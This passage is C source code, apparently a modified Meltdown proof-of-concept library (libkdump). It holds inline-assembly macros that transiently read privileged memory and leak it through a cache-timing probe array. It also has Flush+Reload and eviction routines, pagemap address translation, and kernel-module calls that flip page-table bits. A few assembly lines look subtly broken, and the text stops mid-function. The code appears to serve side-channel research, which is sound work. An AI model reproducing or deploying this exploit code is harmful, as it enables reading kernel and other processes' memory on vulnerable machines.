#define _GNU_SOURCE
#include "libkdump.h"
#include <cpuid.h>
#include <errno.h>
#include <fcntl.h>
#include <memory.h>
#include <pthread.h>
#include <sched.h>
#include <setjmp.h>
#include <signal.h>
#include <stdarg.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/syscall.h>
#include <sys/mman.h>
#include <assert.h>
#include <asm/ldt.h>

libkdump_config_t libkdump_auto_config = {0};

// ---------------------------------------------------------------------------
static jmp_buf buf;

static char *_mem = NULL, *mem = NULL;
static pthread_t *load_thread;
static size_t phys = 0;
static size_t legal = 0;
static int dbg = 0;

static libkdump_config_t config;

#define EVICTION_SET_LEN 32
static char *_evict = NULL, *evict = NULL;
static size_t evict_phys[EVICTION_SET_LEN] = {0};

int monitor_count;
#define NUM_COUNTERS 2
long long values[NUM_COUNTERS];
long long accumulate_values[NUM_COUNTERS];

struct user_desc *table_entry_ptr = NULL;
int to_modify_ldt = 0;
int to_backup_stack = 0;
char *stack_backup = NULL;

static int setexec = 0;
static char buffer[40];

static uint64_t ts = 0;

#ifndef ETIME
#define ETIME 62
#endif

#define NO_TSX

#if defined(NO_TSX) && defined(FORCE_TSX)
#error NO_TSX and FORCE_TSX cannot be used together!
#endif

#ifndef NO_TSX
#define _XBEGIN_STARTED (~0u)
#endif

#if defined(__i386__) && defined(FORCE_TSX)
#undef FORCE_TSX
#warning TSX cannot be forced on __i386__ platform, proceeding with compilation without it
#endif

#define MAX_MEASUREMENT 100
#define MAX_WINDOW_SIZE 140

extern const char meltdown_depth_begin[], meltdown_depth_end[];
extern const char meltdown_bound_begin[], meltdown_bound_end[];
extern const char meltdown_segment_ds_begin[], meltdown_segment_ds_end[];
extern const char meltdown_segment_ss_begin[], meltdown_segment_ss_end[];
extern const char meltdown_segment_ss_np_begin[], meltdown_segment_ss_np_end[];
extern const char meltdown_segment_cs_begin[], meltdown_segment_cs_end[];
extern const char meltdown_segment_ds_null_begin[], meltdown_segment_ds_null_end[];
extern const char meltdown_segment_ss_null_begin[], meltdown_segment_ss_null_end[];
extern const char meltdown_segment_ds_privilege_begin[], meltdown_segment_ds_privilege_end[];
extern const char meltdown_segment_ss_privilege_begin[], meltdown_segment_ss_privilege_end[];
extern const char meltdown_segment_ds_write_begin[], meltdown_segment_ds_write_end[];
extern const char meltdown_segment_cs_write_begin[], meltdown_segment_cs_write_end[];

#define LDT_READ 0
#define LDT_WRITE 1

#ifdef __x86_64__

// ---------------------------------------------------------------------------
#define P_BIT 0
#define RESERVED_BIT 1

// ---------------------------------------------------------------------------
#define meltdown                                                               \
asm volatile("1:\n"                                                          \
	"movq (%%rsi), %%rsi\n"                                         \
	"movzx (%%rcx), %%rax\n"                                         \
	"shl $12, %%rax\n"                                              \
	"jz 1b\n"                                                       \
	"movq (%%rbx,%%rax,1), %%rbx\n"                                 \
	:                                                               \
	: "c"(phys), "b"(mem), "S"(0)                                   \
	: "rax");

// ---------------------------------------------------------------------------
#define meltdown_nonull                                                        \
asm volatile("1:\n"                                                          \
	"movzx (%%rcx), %%rax\n"                                         \
	"shl $12, %%rax\n"                                              \
	"jz 1b\n"                                                       \
	"movq (%%rbx,%%rax,1), %%rbx\n"                                 \
	:                                                               \
	: "c"(phys), "b"(mem)                                           \
	: "rax");

// ---------------------------------------------------------------------------
#define meltdown_fast                                                          \
asm volatile("movzx (%%rcx), %%rax\n"                                         \
	"shl $12, %%rax\n"                                              \
	"movq (%%rbx,%%rax,1), %%rbx\n"                                 \
	:                                                               \
	: "c"(phys), "b"(mem)                                           \
	: "rax");

// ---------------------------------------------------------------------------
#define meltdown_depth                                                          \
asm volatile("sub %%rbx, %%rcx\n"                                             \
	"sub $64, %%rbx\n"                                              \
	"movq (%%rbx), %%rdi\n"                                         \
	"movq (%%rdi, %%rcx, 1), %%rcx\n"                               \
	"movq (%%rdi, %%rcx, 1), %%rcx\n"                                \
	"add $1, %%rcx\n"                                               \
	"sub $1, %%rcx\n"                                               \
	"add $1, %%rcx\n"                                               \
	"sub $1, %%rcx\n"                                               \
	"add $1, %%rcx\n"                                               \
	"sub $1, %%rcx\n"                                               \
	"add $1, %%rcx\n"                                               \
	"sub $1, %%rcx\n"                                               \
	"add $1, %%rcx\n"                                               \
	"sub $1, %%rcx\n"                                               \
	"add $1, %%rcx\n"                                               \
	"sub $1, %%rcx\n"                                               \
	"add $1, %%rcx\n"                                               \
	"sub $1, %%rcx\n"                                               \
	"add $1, %%rcx\n"                                               \
	"sub $1, %%rcx\n"                                               \
	"add $1, %%rcx\n"                                               \
	"sub $1, %%rcx\n"                                               \
	"add $1, %%rcx\n"                                               \
	"sub $1, %%rcx\n"                                               \
	"add $1, %%rcx\n"                                               \
	"sub $1, %%rcx\n"                                               \
	"add $1, %%rcx\n"                                               \
	"sub $1, %%rcx\n"                                               \
	"add $1, %%rcx\n"                                               \
	"sub $1, %%rcx\n"                                               \
	"add $1, %%rcx\n"                                               \
	"sub $1, %%rcx\n"                                               \
	"add $1, %%rcx\n"                                               \
	"sub $1, %%rcx\n"                                               \
	"add $1, %%rcx\n"                                               \
	"sub $1, %%rcx\n"                                               \
	"add $1, %%rcx\n"                                               \
	"sub $1, %%rcx\n"                                               \
	"add $1, %%rcx\n"                                               \
	"sub $1, %%rcx\n"                                               \
	"add $1, %%rcx\n"                                               \
	"sub $1, %%rcx\n"                                               \
	"add $1, %%rcx\n"                                               \
	"sub $1, %%rcx\n"                                               \
	"add $1, %%rcx\n"                                               \
	"sub $1, %%rcx\n"                                               \
	"add $1, %%rcx\n"                                               \
	"sub $1, %%rcx\n"                                               \
	"add $1, %%rcx\n"                                               \
	"sub $1, %%rcx\n"                                               \
	"add $1, %%rcx\n"                                               \
	"sub $1, %%rcx\n"                                               \
	"add $1, %%rcx\n"                                               \
	"sub $1, %%rcx\n"                                               \
	"add $1, %%rcx\n"                                               \
	"sub $1, %%rcx\n"                                               \
	"add $1, %%rcx\n"                                               \
	"sub $1, %%rcx\n"                                               \
	"add $1, %%rcx\n"                                               \
	"sub $1, %%rcx\n"                                               \
	"add $1, %%rcx\n"                                               \
	"sub $1, %%rcx\n"                                               \
	"add $1, %%rcx\n"                                               \
	"sub $1, %%rcx\n"                                               \
	"add $1, %%rcx\n"                                               \
	"sub $1, %%rcx\n"                                               \
	"add $1, %%rcx\n"                                               \
	"sub $1, %%rcx\n"                                               \
	"add $1, %%rcx\n"                                               \
	"sub $1, %%rcx\n"                                               \
	"add $1, %%rcx\n"                                               \
	"sub $1, %%rcx\n"                                               \
	"add $1, %%rcx\n"                                               \
	"sub $1, %%rcx\n"                                               \
	"add $1, %%rcx\n"                                               \
	"sub $1, %%rcx\n"                                               \
	"add $1, %%rcx\n"                                               \
	"sub $1, %%rcx\n"                                               \
	"add $1, %%rcx\n"                                               \
	"sub $1, %%rcx\n"                                               \
	"add $1, %%rcx\n"                                               \
	"sub $1, %%rcx\n"                                               \
	"add $1, %%rcx\n"                                               \
	"sub $1, %%rcx\n"                                               \
	"add $1, %%rcx\n"                                               \
	"sub $1, %%rcx\n"                                               \
	"add $1, %%rcx\n"                                               \
	"sub $1, %%rcx\n"                                               \
	"add $1, %%rcx\n"                                               \
	"sub $1, %%rcx\n"                                               \
	"add $1, %%rcx\n"                                               \
	"sub $1, %%rcx\n"                                               \
	"add $1, %%rcx\n"                                               \
	"sub $1, %%rcx\n"                                               \
	"add $1, %%rcx\n"                                               \
	"sub $1, %%rcx\n"                                               \
	"add $1, %%rcx\n"                                               \
	"sub $1, %%rcx\n"                                               \
	"add $1, %%rcx\n"                                               \
	"sub $1, %%rcx\n"                                               \
	"add $1, %%rcx\n"                                               \
	"sub $1, %%rcx\n"                                               \
	"add $1, %%rcx\n"                                               \
	"sub $1, %%rcx\n"                                               \
	"add $1, %%rcx\n"                                               \
	"sub $1, %%rcx\n"                                               \
	"add $1, %%rcx\n"                                               \
	"sub $1, %%rcx\n"                                               \
	"add $1, %%rcx\n"                                               \
	"sub $1, %%rcx\n"                                               \
	"add $1, %%rcx\n"                                               \
	"sub $1, %%rcx\n"                                               \
	"add $1, %%rcx\n"                                               \
	"sub $1, %%rcx\n"                                               \
	"add $1, %%rcx\n"                                               \
	"sub $1, %%rcx\n"                                               \
	"add $1, %%rcx\n"                                               \
	"sub $1, %%rcx\n"                                               \
	"add $1, %%rcx\n"                                               \
	"sub $1, %%rcx\n"                                               \
	"add $1, %%rcx\n"                                               \
	"sub $1, %%rcx\n"                                               \
	"add $1, %%rcx\n"                                               \
	"sub $1, %%rcx\n"                                               \
	"add $1, %%rcx\n"                                               \
	"sub $1, %%rcx\n"                                               \
	"add $1, %%rcx\n"                                               \
	"sub $1, %%rcx\n"                                               \
	"add $1, %%rcx\n"                                               \
	"sub $1, %%rcx\n"                                               \
	"add $1, %%rcx\n"                                               \
	"sub $1, %%rcx\n"                                               \
	"add $1, %%rcx\n"                                               \
	"sub $1, %%rcx\n"                                               \
	"add $1, %%rcx\n"                                               \
	"sub $1, %%rcx\n"                                               \
	"add $1, %%rcx\n"                                               \
	"sub $1, %%rcx\n"                                               \
	"add $1, %%rcx\n"                                               \
	"sub $1, %%rcx\n"                                               \
	"add $1, %%rcx\n"                                               \
	"sub $1, %%rcx\n"                                               \
	"add $1, %%rcx\n"                                               \
	"sub $1, %%rcx\n"                                               \
	"add $1, %%rcx\n"                                               \
	"sub $1, %%rcx\n"                                               \
	"add $1, %%rcx\n"                                               \
	"sub $1, %%rcx\n"                                               \
	"add $1, %%rcx\n"                                               \
	"sub $1, %%rcx\n"                                               \
	"add $1, %%rcx\n"                                               \
	"sub $1, %%rcx\n"                                               \
	"add $1, %%rcx\n"                                               \
	"sub $1, %%rcx\n"                                               \
	"add $1, %%rcx\n"                                               \
	"sub $1, %%rcx\n"                                               \
	"add $1, %%rcx\n"                                               \
	"sub $1, %%rcx\n"                                               \
	"add $1, %%rcx\n"                                               \
	"sub $1, %%rcx\n"                                               \
	"add $1, %%rcx\n"                                               \
	"sub $1, %%rcx\n"                                               \
	"add $1, %%rcx\n"                                               \
	"sub $1, %%rcx\n"                                               \
	:                                                                \
	: "c"(phys), "b"(mem)                                            \
	: "rax", "rdx", "rdi", "rsi", "edx", "eax", "xmm0", "xmm1");

#else /* __i386__ */

// ---------------------------------------------------------------------------
#define meltdown                                                               \
asm volatile("1:\n"                                                           \
	"movl (%%esi), %%esi\n"                                          \
	"movzx (%%ecx), %%eax\n"                                          \
	"shl $12, %%eax\n"                                               \
	"jz 1b\n"                                                        \
	"mov (%%ebx,%%eax,1), %%ebx\n"                                   \
	:                                                                \
	: "c"(phys), "b"(mem), "S"(0)                                    \
	: "eax");

// ---------------------------------------------------------------------------
#define meltdown_nonull                                                        \
asm volatile("1:\n"                                                          \
	"movzx (%%ecx), %%eax\n"                                         \
	"shl $12, %%eax\n"                                              \
	"jz 1b\n"                                                       \
	"mov (%%ebx,%%eax,1), %%ebx\n"                                  \
	:                                                               \
	: "c"(phys), "b"(mem)                                           \
	: "eax");

// ---------------------------------------------------------------------------
#define meltdown_fast                                                          \
asm volatile("movzx (%%ecx), %%eax\n"                                         \
	"shl $12, %%eax\n"                                              \
	"mov (%%ebx,%%eax,1), %%ebx\n"                                  \
	:                                                               \
	: "c"(phys), "b"(mem)                                           \
	: "eax");

// ---------------------------------------------------------------------------
#define meltdown_depth                                                          \
asm volatile("sub %%ebx, %%ecx\n"                                             \
	"sub $64, %%ebx\n"                                              \
	"movl (%%ebx), %%edi\n"                                         \
	"movl (%%edi, %%ecx, 1), %%ecx\n"                               \
	"movl (%%edi, %%ecx, 1), %%ecx\n"                                \
	"add $1, %%ecx\n"                                               \
	"sub $1, %%ecx\n"                                               \
	"add $1, %%ecx\n"                                               \
	"sub $1, %%ecx\n"                                               \
	"add $1, %%ecx\n"                                               \
	"sub $1, %%ecx\n"                                               \
	"add $1, %%ecx\n"                                               \
	"sub $1, %%ecx\n"                                               \
	"add $1, %%ecx\n"                                               \
	"sub $1, %%ecx\n"                                               \
	"add $1, %%ecx\n"                                               \
	"sub $1, %%ecx\n"                                               \
	"add $1, %%ecx\n"                                               \
	"sub $1, %%ecx\n"                                               \
	"add $1, %%ecx\n"                                               \
	"sub $1, %%ecx\n"                                               \
	"add $1, %%ecx\n"                                               \
	"sub $1, %%ecx\n"                                               \
	"add $1, %%ecx\n"                                               \
	"sub $1, %%ecx\n"                                               \
	"add $1, %%ecx\n"                                               \
	"sub $1, %%ecx\n"                                               \
	"add $1, %%ecx\n"                                               \
	"sub $1, %%ecx\n"                                               \
	"add $1, %%ecx\n"                                               \
	"sub $1, %%ecx\n"                                               \
	"add $1, %%ecx\n"                                               \
	"sub $1, %%ecx\n"                                               \
	"add $1, %%ecx\n"                                               \
	"sub $1, %%ecx\n"                                               \
	"add $1, %%ecx\n"                                               \
	"sub $1, %%ecx\n"                                               \
	"add $1, %%ecx\n"                                               \
	"sub $1, %%ecx\n"                                               \
	"add $1, %%ecx\n"                                               \
	"sub $1, %%ecx\n"                                               \
	"add $1, %%ecx\n"                                               \
	"sub $1, %%ecx\n"                                               \
	"add $1, %%ecx\n"                                               \
	"sub $1, %%ecx\n"                                               \
	"add $1, %%ecx\n"                                               \
	"sub $1, %%ecx\n"                                               \
	"add $1, %%ecx\n"                                               \
	"sub $1, %%ecx\n"                                               \
	"add $1, %%ecx\n"                                               \
	"sub $1, %%ecx\n"                                               \
	"add $1, %%ecx\n"                                               \
	"sub $1, %%ecx\n"                                               \
	"add $1, %%ecx\n"                                               \
	"sub $1, %%ecx\n"                                               \
	"add $1, %%ecx\n"                                               \
	"sub $1, %%ecx\n"                                               \
	"add $1, %%ecx\n"                                               \
	"sub $1, %%ecx\n"                                               \
	"add $1, %%ecx\n"                                               \
	"sub $1, %%ecx\n"                                               \
	"add $1, %%ecx\n"                                               \
	"sub $1, %%ecx\n"                                               \
	"add $1, %%ecx\n"                                               \
	"sub $1, %%ecx\n"                                               \
	"add $1, %%ecx\n"                                               \
	"sub $1, %%ecx\n"                                               \
	"add $1, %%ecx\n"                                               \
	"sub $1, %%ecx\n"                                               \
	"add $1, %%ecx\n"                                               \
	"sub $1, %%ecx\n"                                               \
	"add $1, %%ecx\n"                                               \
	"sub $1, %%ecx\n"                                               \
	"add $1, %%ecx\n"                                               \
	"sub $1, %%ecx\n"                                               \
	"add $1, %%ecx\n"                                               \
	"sub $1, %%ecx\n"                                               \
	"add $1, %%ecx\n"                                               \
	"sub $1, %%ecx\n"                                               \
	"add $1, %%ecx\n"                                               \
	"sub $1, %%ecx\n"                                               \
	"add $1, %%ecx\n"                                               \
	"sub $1, %%ecx\n"                                               \
	"add $1, %%ecx\n"                                               \
	"sub $1, %%ecx\n"                                               \
	"add $1, %%ecx\n"                                               \
	"sub $1, %%ecx\n"                                               \
	"add $1, %%ecx\n"                                               \
	"sub $1, %%ecx\n"                                               \
	"add $1, %%ecx\n"                                               \
	"sub $1, %%ecx\n"                                               \
	"add $1, %%ecx\n"                                               \
	"sub $1, %%ecx\n"                                               \
	"add $1, %%ecx\n"                                               \
	"sub $1, %%ecx\n"                                               \
	"add $1, %%ecx\n"                                               \
	"sub $1, %%ecx\n"                                               \
	"add $1, %%ecx\n"                                               \
	"sub $1, %%ecx\n"                                               \
	"add $1, %%ecx\n"                                               \
	"sub $1, %%ecx\n"                                               \
	"add $1, %%ecx\n"                                               \
	"sub $1, %%ecx\n"                                               \
	"add $1, %%ecx\n"                                               \
	"sub $1, %%ecx\n"                                               \
	"add $1, %%ecx\n"                                               \
	"sub $1, %%ecx\n"                                               \
	"add $1, %%ecx\n"                                               \
	"sub $1, %%ecx\n"                                               \
	"add $1, %%ecx\n"                                               \
	"sub $1, %%ecx\n"                                               \
	"add $1, %%ecx\n"                                               \
	"sub $1, %%ecx\n"                                               \
	"add $1, %%ecx\n"                                               \
	"sub $1, %%ecx\n"                                               \
	"add $1, %%ecx\n"                                               \
	"sub $1, %%ecx\n"                                               \
	"add $1, %%ecx\n"                                               \
	"sub $1, %%ecx\n"                                               \
	"add $1, %%ecx\n"                                               \
	"sub $1, %%ecx\n"                                               \
	"add $1, %%ecx\n"                                               \
	"sub $1, %%ecx\n"                                               \
	"add $1, %%ecx\n"                                               \
	"sub $1, %%ecx\n"                                               \
	"add $1, %%ecx\n"                                               \
	"sub $1, %%ecx\n"                                               \
	"add $1, %%ecx\n"                                               \
	"sub $1, %%ecx\n"                                               \
	"add $1, %%ecx\n"                                               \
	"sub $1, %%ecx\n"                                               \
	"add $1, %%ecx\n"                                               \
	"sub $1, %%ecx\n"                                               \
	"add $1, %%ecx\n"                                               \
	"sub $1, %%ecx\n"                                               \
	"add $1, %%ecx\n"                                               \
	"sub $1, %%ecx\n"                                               \
	"add $1, %%ecx\n"                                               \
	"sub $1, %%ecx\n"                                               \
	"add $1, %%ecx\n"                                               \
	"sub $1, %%ecx\n"                                               \
	"add $1, %%ecx\n"                                               \
	"sub $1, %%ecx\n"                                               \
	"add $1, %%ecx\n"                                               \
	"sub $1, %%ecx\n"                                               \
	"add $1, %%ecx\n"                                               \
	"sub $1, %%ecx\n"                                               \
	"add $1, %%ecx\n"                                               \
	"sub $1, %%ecx\n"                                               \
	"add $1, %%ecx\n"                                               \
	"sub $1, %%ecx\n"                                               \
	"add $1, %%ecx\n"                                               \
	"sub $1, %%ecx\n"                                               \
	"add $1, %%ecx\n"                                               \
	"sub $1, %%ecx\n"                                               \
	"add $1, %%ecx\n"                                               \
	"sub $1, %%ecx\n"                                               \
	"add $1, %%ecx\n"                                               \
	"sub $1, %%ecx\n"                                               \
	"add $1, %%ecx\n"                                               \
	"sub $1, %%ecx\n"                                               \
	"add $1, %%ecx\n"                                               \
	"sub $1, %%ecx\n"                                               \
	"add $1, %%ecx\n"                                               \
	"sub $1, %%ecx\n"                                               \
	:                                                                \
	: "c"(phys), "b"(mem)                                            \
	: "eax", "edx", "edi", "esi");

#endif

#ifndef MELTDOWN
#define MELTDOWN meltdown_depth
#endif

// ---------------------------------------------------------------------------
typedef enum { ERROR, INFO, SUCCESS } d_sym_t;

// ---------------------------------------------------------------------------
static void debug(d_sym_t symbol, const char *fmt, ...) {
	if (!dbg)
		return;

	switch (symbol) {
		case ERROR:
		printf("\x1b[31;1m[-]\x1b[0m ");
		break;
		case INFO:
		printf("\x1b[33;1m[.]\x1b[0m ");
		break;
		case SUCCESS:
		printf("\x1b[32;1m[+]\x1b[0m ");
		break;
		default:
		break;
	}
	va_list ap;
	va_start(ap, fmt);
	vfprintf(stdout, fmt, ap);
	va_end(ap);
}

// ---------------------------------------------------------------------------
static inline size_t rdtsc() {
	size_t a = 0, d = 0;
	asm volatile("mfence");
#if defined(USE_RDTSCP) && defined(__x86_64__)
	asm volatile("rdtscp" : "=a"(a), "=d"(d) :: "rcx");
#elif defined(USE_RDTSCP) && defined(__i386__)
	asm volatile("rdtscp" : "=A"(a), :: "ecx");
#elif defined(__x86_64__)
	asm volatile("rdtsc" : "=a"(a), "=d"(d));
#elif defined(__i386__)
	asm volatile("rdtsc" : "=A"(a));
#endif
	a = (d << 32) | a;
	asm volatile("mfence");
	return a;
}

#if defined(__x86_64__)
// ---------------------------------------------------------------------------
static inline void maccess(void *p) {
	asm volatile("movq (%0), %%rax\n" : : "c"(p) : "rax");
}

// ---------------------------------------------------------------------------
static void flush(void *p) {
	asm volatile("clflush 0(%0)\n" : : "c"(p) : "rax");
}
#else
// ---------------------------------------------------------------------------
static inline void maccess(void *p) {
	asm volatile("movl (%0), %%eax\n" : : "c"(p) : "eax");
}

// ---------------------------------------------------------------------------
static void flush(void *p) {
	asm volatile("clflush 0(%0)\n" : : "c"(p) : "eax");
}
#endif

static void l1_evict(void *p) {
	int i, j;
	int no_conflict[EVICTION_SET_LEN];
	size_t l1_offset = ((size_t)p) & ((1 << 12) - 1);
	size_t l2_offset = (libkdump_virt_to_phys((size_t)p) >> 12) & ((1 << 4) - 1);

	// Make sure they don't conflict in L2 with p or with each other
	for (i = 0; i < EVICTION_SET_LEN; i++) {
		if (!evict_phys[i])
			evict_phys[i] = libkdump_virt_to_phys((size_t)(evict + 4096*i));

		size_t offset = (evict_phys[i] >> 12) & ((1 << 4) - 1);

		if (offset == l2_offset)
			no_conflict[i] = 0;
		else
			no_conflict[i] = 1;
	}

	for (j = 0; j < 100; j++) {
		for (i = 0; i < EVICTION_SET_LEN; i++) {
			if (no_conflict[i]) {
				maccess(evict + 4096*i + (l1_offset));
			}
		}
	}
}

static void *maccess_repeat(void *p) {
	cpu_set_t mask;
	CPU_ZERO(&mask);
	int core_id = 5;
	CPU_SET(core_id, &mask);
	sched_setaffinity(0, sizeof(mask), &mask);

	int i;
	for (i = 0; i < 100; i++)
		maccess(p);
}

static void l2_evict(void *p) {
	flush(p);
	pthread_t th;
	int r = pthread_create(&th, 0, maccess_repeat, p);
	pthread_join(th, 0);
}

// ---------------------------------------------------------------------------
static int __attribute__((always_inline)) flush_reload(void *ptr) {
	size_t start = 0, end = 0;

	start = rdtsc();
	maccess(ptr);
	end = rdtsc();

	flush(ptr);

	if (end - start < config.cache_miss_threshold) {
		return 1;
	}
	return 0;
}

static int __attribute__((always_inline)) l1_evict_reload(void *ptr) {
	size_t latency;

#ifdef __x86_64__
	asm volatile("rdtscp\n"
		"movq %%rax, %%edx\n"
		"movq (%%rdi), %%rcx\n"
		"rdtscp\n"
		"sub %%edx, %%rax\n"
		: "=a"(latency)
		: "D"(ptr)
		: "edx", "rcx", "rdx");
#else
	asm volatile("rdtscp\n"
		"movl %%eax, %%edx\n"
		"movq (%%edi), %%ecx\n"
		"rdtscp\n"
		"sub %%edx, %%eax\n"
		: "=a"(latency)
		: "D"(ptr)
		: "ecx", "edx");
#endif

	l1_evict(ptr);

	if (latency < config.l2_threshold) {
		return 1;
	}
	return 0;
}

static int __attribute__((always_inline)) l2_evict_reload(void *ptr) {
	size_t latency;

#ifdef __x86_64__
	asm volatile("rdtscp\n"
		"movq %%rax, %%edx\n"
		"movq (%%rdi), %%rcx\n"
		"rdtscp\n"
		"sub %%edx, %%rax\n"
		: "=a"(latency)
		: "D"(ptr)
		: "edx", "rcx", "rdx");
#else
	asm volatile("rdtscp\n"
		"movl %%eax, %%edx\n"
		"movq (%%edi), %%ecx\n"
		"rdtscp\n"
		"sub %%edx, %%eax\n"
		: "=a"(latency)
		: "D"(ptr)
		: "ecx", "edx");
#endif

	l2_evict(ptr);

	if (latency < config.l3_threshold) {
		return 1;
	}
	return 0;
}

static int __attribute__((always_inline)) flush_reload_print(void *ptr) {
	size_t latency;

#ifdef __x86_64__
	asm volatile("rdtscp\n"
		"movq %%rax, %%edx\n"
		"movq (%%rdi), %%rcx\n"
		"rdtscp\n"
		"sub %%edx, %%rax\n"
		"clflush (%%rdi)\n"
		: "=a"(latency)
		: "D"(ptr)
		: "edx", "rcx", "rdx");
#else
	asm volatile("rdtscp\n"
		"movl %%eax, %%edx\n"
		"movq (%%edi), %%ecx\n"
		"rdtscp\n"
		"sub %%edx, %%eax\n"
		: "=a"(latency)
		: "D"(ptr)
		: "ecx", "edx");
#endif

	printf("latency: %lu\n", (unsigned long)latency);

	if (latency < config.cache_miss_threshold) {
		return 1;
	}
	return 0;
}

static int __attribute__((always_inline)) l1_evict_reload_print(void *ptr) {
	size_t latency;

#ifdef __x86_64__
	asm volatile("rdtscp\n"
		"movq %%rax, %%edx\n"
		"movq (%%rdi), %%rcx\n"
		"rdtscp\n"
		"sub %%edx, %%rax\n"
		"clflush (%%rdi)\n"
		: "=a"(latency)
		: "D"(ptr)
		: "edx", "rcx", "rdx");
#else
	asm volatile("rdtscp\n"
		"movl %%eax, %%edx\n"
		"movq (%%edi), %%ecx\n"
		"rdtscp\n"
		"sub %%edx, %%eax\n"
		: "=a"(latency)
		: "D"(ptr)
		: "ecx", "edx");
#endif

	l1_evict(ptr);

	printf("latency: %lu\n", (unsigned long)latency);

	if (latency < config.l2_threshold) {
		return 1;
	}
	return 0;
}

static int __attribute__((always_inline)) l2_evict_reload_print(void *ptr) {
	size_t latency;

#ifdef __x86_64__
	asm volatile("rdtscp\n"
		"movq %%rax, %%edx\n"
		"movq (%%rdi), %%rcx\n"
		"rdtscp\n"
		"sub %%edx, %%rax\n"
		"clflush (%%rdi)\n"
		: "=a"(latency)
		: "D"(ptr)
		: "edx", "rcx", "rdx");
#else
	asm volatile("rdtscp\n"
		"movl %%eax, %%edx\n"
		"movq (%%edi), %%ecx\n"
		"rdtscp\n"
		"sub %%edx, %%eax\n"
		: "=a"(latency)
		: "D"(ptr)
		: "ecx", "edx");
#endif

	l2_evict(ptr);

	printf("latency: %lu\n", (unsigned long)latency);

	if (latency < config.l3_threshold) {
		return 1;
	}
	return 0;
}

// ---------------------------------------------------------------------------
size_t libkdump_virt_to_phys_kernel_module(size_t virtual_address) {
	snprintf(buffer, sizeof(buffer), "%d %lx", 4, (unsigned long)virtual_address);
	return write(setexec, buffer, strlen(buffer));
}

// ---------------------------------------------------------------------------
int set_reserved_bit(size_t addr) {
	snprintf(buffer, sizeof(buffer), "%d %lx", 3, (unsigned long)addr);
	return write(setexec, buffer, strlen(buffer));
}

// ---------------------------------------------------------------------------
int set_p_flag(size_t addr) {
	snprintf(buffer, sizeof(buffer), "%d %lx", 7, (unsigned long)addr);
	return write(setexec, buffer, strlen(buffer));
}

// ---------------------------------------------------------------------------
int set_rw_flag(size_t addr) {
	snprintf(buffer, sizeof(buffer), "%d %lx", 8, (unsigned long)addr);
	return write(setexec, buffer, strlen(buffer));
}

// ---------------------------------------------------------------------------
int set_xd_flag(size_t addr) {
	snprintf(buffer, sizeof(buffer), "%d %lx", 9, (unsigned long)addr);
	return write(setexec, buffer, strlen(buffer));
}

// ---------------------------------------------------------------------------
int libkdump_load_tlb(size_t addr, int mode) {
	if (mode == 0) {
		snprintf(buffer, sizeof(buffer), "%d %lx", 2, (unsigned long)addr);
		return write(setexec, buffer, strlen(buffer));
	}
	else {
		maccess((void *)addr);
	}
}

// ---------------------------------------------------------------------------
int libkdump_flush_tlb(size_t addr) {
	snprintf(buffer, sizeof(buffer), "%d %lx", 1, (unsigned long)addr);
	return write(setexec, buffer, strlen(buffer));
}

// ---------------------------------------------------------------------------
int libkdump_flush_tlb_all() {
	snprintf(buffer, sizeof(buffer), "%d", 0);
	return write(setexec, buffer, strlen(buffer));
}

// ---------------------------------------------------------------------------
int libkdump_kernel_read_CR4() {
	snprintf(buffer, sizeof(buffer), "%x", 0xa);
	return write(setexec, buffer, strlen(buffer));
}

// ---------------------------------------------------------------------------
int libkdump_kernel_read_MSR(size_t addr) {
	snprintf(buffer, sizeof(buffer), "%x %lx", 0xb, (unsigned long)addr);
	return write(setexec, buffer, strlen(buffer));
}

// ---------------------------------------------------------------------------
void libkdump_prepare_data_condition(size_t legal_addr, int cache_level, int tlb_present) {
	int ret;
	if (tlb_present == TLB_PRESENT) {
		ret = libkdump_load_tlb(phys, 1);
	}

	switch (cache_level) {
		case CACHE_LEVEL_L1:
		maccess((void *)legal_addr);
		break;
		case CACHE_LEVEL_L2:
		maccess((void *)legal_addr);
		l1_evict((void *)legal_addr);
		break;
		case CACHE_LEVEL_L3:
		l2_evict((void *)legal_addr);
		break;
		case CACHE_LEVEL_MEMORY:
		flush((void *)legal_addr);
		break;
		default:
		break;
	}
	asm volatile("mfence");

	if (tlb_present == TLB_NOT_PRESENT) {;
		ret = libkdump_flush_tlb(phys);
	}
}

// ---------------------------------------------------------------------------
static void *nopthread(void *dummy) {
	while (1) {
		asm volatile("nop");
	}
}

// ---------------------------------------------------------------------------
static void *syncthread(void *dummy) {
	while (1) {
		sync();
	}
}

// ---------------------------------------------------------------------------
static void *yieldthread(void *dummy) {
	while (1) {
		sched_yield();
	}
}

#ifndef NO_TSX
// ---------------------------------------------------------------------------
static __attribute__((always_inline)) inline unsigned int xbegin(void) {
	unsigned status;
	//asm volatile("xbegin 1f \n 1:" : "=a"(status) : "a"(-1UL) : "memory");
	asm volatile(".byte 0xc7,0xf8,0x00,0x00,0x00,0x00" : "=a"(status) : "a"(-1UL) : "memory");
	return status;
}

// ---------------------------------------------------------------------------
static __attribute__((always_inline)) inline void xend(void) {
	//asm volatile("xend" ::: "memory");
	asm volatile(".byte 0x0f; .byte 0x01; .byte 0xd5" ::: "memory");
}
#endif

// ---------------------------------------------------------------------------
size_t libkdump_virt_to_phys(size_t virtual_address) {
	static int pagemap = -1;
	if (pagemap == -1) {
		pagemap = open("/proc/self/pagemap", O_RDONLY);
		if (pagemap < 0) {
			errno = EPERM;
			return 0;
		}
	}
	uint64_t value;
	int got = pread(pagemap, &value, 8, (virtual_address / 0x1000) * 8);
	if (got != 8) {
		errno = EPERM;
		return 0;
	}
	uint64_t page_frame_number = value & ((1ULL << 54) - 1);
	if (page_frame_number == 0) {
		errno = EPERM;
		return 0;
	}
	return page_frame_number * 0x1000 + virtual_address % 0x1000;
}

// ---------------------------------------------------------------------------
static int check_tsx() {
#if !defined(NO_TSX) && !defined(FORCE_TSX)
	if (__get_cpuid_max(0, NULL) >= 7) {
		unsigned a, b, c, d;
		__cpuid_count(7, 0, a, b, c, d);
		return (b & (1 << 11)) ? 1 : 0;
	} else
	return 0;
#elif defined(FORCE_TSX)
	return 1;
#else /* defined (NO_TSX) */
	return 0;
#endif
}

// ---------------------------------------------------------------------------
static void detect_fault_handling() {
	if (check_tsx()) {
		debug(SUCCESS, "Using Intel TSX\n");
		config.fault_handling = TSX;
	} else {
		debug(INFO, "No Intel TSX, fallback to signal handler\n");
		config.fault_handling = SIGNAL_HANDLER;
	}
}

// ---------------------------------------------------------------------------
static void detect_flush_reload_threshold() {
	size_t reload_time = 0, flush_reload_time = 0, i, count = 1000000;
	size_t dummy[16];
	size_t *ptr = dummy + 8;
	uint64_t start = 0, end = 0;

